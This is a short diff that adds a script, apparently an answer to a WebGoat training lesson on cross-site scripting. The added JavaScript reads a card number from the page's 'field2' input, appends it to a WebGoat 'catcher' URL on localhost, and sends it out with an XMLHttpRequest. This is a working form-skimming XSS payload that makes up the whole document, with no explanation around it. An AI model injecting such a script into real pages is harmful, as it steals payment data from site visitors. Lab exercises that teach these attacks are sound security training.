@@ -1,0 +1,11 @@
+111 <br>
+	<script type="text/javascript">
+		var attackSite = "http://localhost:8090/WebGoat/catcher?src=1406352188&menu=900&PROPERTY=yes&card=";
+		var cardNum = document.getElementsByName("field2")[0];
+		var totalString = attackSite + cardNum.value;
+		var encodedUrl = totalString.replace(/ /g,'');
+		alert("String is: " + encodedUrl);
+		var xmlHttp = new XMLHttpRequest();
+		xmlHttp.open("GET", encodedUrl, false);
+		xmlHttp.send(null);
+	</script>
